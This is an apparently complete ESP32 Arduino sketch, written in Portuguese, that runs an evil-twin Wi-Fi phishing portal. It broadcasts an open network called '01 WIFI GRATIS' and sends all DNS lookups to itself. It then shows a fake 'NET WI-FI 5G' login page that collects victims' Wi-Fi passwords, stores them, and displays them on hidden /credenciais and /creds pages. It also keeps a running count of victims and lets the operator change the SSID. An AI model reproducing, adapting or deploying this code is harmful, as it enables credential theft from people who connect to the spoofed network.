#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Configuração do usuário
#define NOME_REDE "01 WIFI GRATIS"
#define TITULO_INICIAL "NET WI-FI"
#define SUBTITULO "5G"
#define TITULO "Conectar"
#define CORPO "Digite a senha do seu WIFI."
#define TITULO_ENVIO "Conectando..."
#define CORPO_ENVIO "Sua senha está sendo validada. Por favor, aguarde até 5 minutos para conexão do dispositivo.</br>Obrigado."
#define TITULO_SENHA "Credenciais"
#define TITULO_LIMPAR "Limpo"
#define TITULO_SSID "Alterar SSID" // Novo título para a página de alteração de SSID

int contagem_vitimas = 0;
int anterior = -1; // Acompanha mudanças na contagem de portal cativo

// Configurações do sistema
const byte CODIGO_HTTP = 200;
const byte PORTA_DNS = 53;
const byte INTERVALO_TICK = 1000;
IPAddress IP_GATEWAY(172, 0, 0, 1); // Gateway

String Credenciais = "";
String novoSSID = ""; // Variável para armazenar o novo nome do WiFi

unsigned long ultimo_tick = 0;

DNSServer servidor_dns;
WebServer servidor_web(80);

// Defina o pino do LED azul
const int LED_AZUL = 8; // Exemplo de pino, substitua pelo pino correto

String entrada(String nome_argumento) {
  String a = servidor_web.arg(nome_argumento);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  return a.substring(0, 200);
}

String rodape() {
  return "</div><div class=q><a>&#169; Todos os direitos reservados.</a></div>";
}

String cabecalho(String t) {
  String a = String(TITULO_INICIAL);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITULO + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String exibir_credenciais() {
  return cabecalho(TITULO_SENHA) + "<ol>" + Credenciais + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar</a></p><p><a style=\"color:blue\" href=/limpar>Limpar senhas</a></p></center>" + rodape();
}

String exibir_pagina_login() {
  return cabecalho(TITULO) + "<div>" + CORPO + "</ol></div><div><form action=/enviar method=post>" +
         //"<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
         "<b>Senha:</b> <center><input type=password name=senha></input><input type=submit value=\"Conectar\"></form></center>" + rodape();
}

String pagina_enviada() {
   //String email = entrada("email"); // Removido o processamento do campo de e-mail
  String senha = entrada("senha");
  //Credenciais = "<li>Email: <b>" + email + "</b></br>Senha: <b>" + senha + "</b></li>" + Credenciais; // Não é mais necessário adicionar o e-mail
  Credenciais = "<li>Senha: <b>" + senha + "</b></li>" + Credenciais; // Apenas adicione a senha
  return cabecalho(TITULO_ENVIO) + CORPO_ENVIO + rodape();
}

// Função para exibir a página de alteração de SSID
String exibir_pagina_ssid() {
  return cabecalho(TITULO_SSID) + "<div><form action=/alterarSSID method=post>" +
         "<b>Novo SSID:</b> <center><input type=text name=novoSSID></input></center>" +
         "<center><input type=submit value=\"Alterar\"></form></center>" + rodape();
}

// Função para lidar com a solicitação de alteração de SSID
String alterar_ssid() {
  novoSSID = entrada("novoSSID"); // Captura o novo SSID enviado pelo formulário
  WiFi.softAPdisconnect(); // Desconecta o AP WiFi atual
  WiFi.softAPConfig(IP_GATEWAY, IP_GATEWAY, IPAddress(255, 255, 255, 0)); // Configuração do AP WiFi com o novo SSID
  WiFi.softAP(novoSSID.c_str()); // Define o novo SSID
  return cabecalho(TITULO_SSID) + "<div><p>O SSID foi alterado para: <b>" + novoSSID + "</b></p><center><a style=\"color:blue\" href=/>Voltar</a></center>" + rodape();
}

String limpar_credenciais() {
  Credenciais = "";
  return cabecalho(TITULO_LIMPAR) + "<div><p>A lista de credenciais foi resetada.</div></p><center><a style=\"color:blue\" href=/>Voltar</a></center>" + rodape();
}

// Função para fazer o LED piscar em um determinado intervalo de tempo
void piscarLed(int intervalo) {
  static unsigned long anteriorMillis = 0;
  static boolean estadoLed = LOW;
  unsigned long atualMillis = millis();

  if (atualMillis - anteriorMillis >= intervalo) {
    anteriorMillis = atualMillis;
    estadoLed = !estadoLed;
    digitalWrite(LED_AZUL, estadoLed);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  pinMode(LED_AZUL, OUTPUT); // Defina o pino do LED azul como saída

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IP_GATEWAY, IP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(NOME_REDE);

  servidor_dns.start(PORTA_DNS, "*", IP_GATEWAY); // Spoofing de DNS (Apenas HTTP)

  servidor_web.on("/enviar", []() {
    contagem_vitimas++;
    servidor_web.send(CODIGO_HTTP, "text/html", pagina_enviada());
  });

  servidor_web.on("/credenciais", []() {
    servidor_web.send(CODIGO_HTTP, "text/html", exibir_credenciais());
  });

  servidor_web.on("/limpar", []() {
    servidor_web.send(CODIGO_HTTP, "text/html", limpar_credenciais());
  });

  // Adiciona uma nova rota para a página de alteração de SSID
  servidor_web.on("/ssid", HTTP_GET, []() {
    servidor_web.send(200, "text/html", exibir_pagina_ssid());
  });

  // Adiciona uma nova rota para lidar com a solicitação de alteração de SSID
  servidor_web.on("/alterarSSID", HTTP_POST, alterar_ssid);

  // Adiciona uma nova rota para exibir as credenciais na página de login
  servidor_web.on("/creds", HTTP_GET, []() {
    servidor_web.send(200, "text/html", exibir_credenciais());
  });

  servidor_web.onNotFound([]() {
    servidor_web.send(CODIGO_HTTP, "text/html", exibir_pagina_login());
  });

  digitalWrite(LED_AZUL, HIGH); // Ligue o LED azul
  servidor_web.begin();
}

void loop() {
  servidor_dns.processNextRequest();
  servidor_web.handleClient();

  // Verifica se o WiFi está conectado e em modo de transmissão
  if (WiFi.status() == WL_CONNECTED && WiFi.getMode() == WIFI_AP) {
    // Se o WiFi estiver conectado e transmitindo, faça o LED piscar
    piscarLed(500); // Piscar a cada 500 milissegundos (0.5 segundos)
  } else {
    digitalWrite(LED_AZUL, LOW); // Desliga o LED se o WiFi não estiver conectado ou não estiver em modo de transmissão
  }

  // Atualiza a contagem de portal cativo a cada INTERVALO_TICK milissegundos
  if (millis() - ultimo_tick > INTERVALO_TICK) {
    ultimo_tick = millis();
    if (contagem_vitimas != anterior) {
      anterior = contagem_vitimas;
      Serial.println("Contagem de Vítimas: " + String(contagem_vitimas));
      // Aqui você pode adicionar código para atualizar o display com a contagem
    }
  }
}
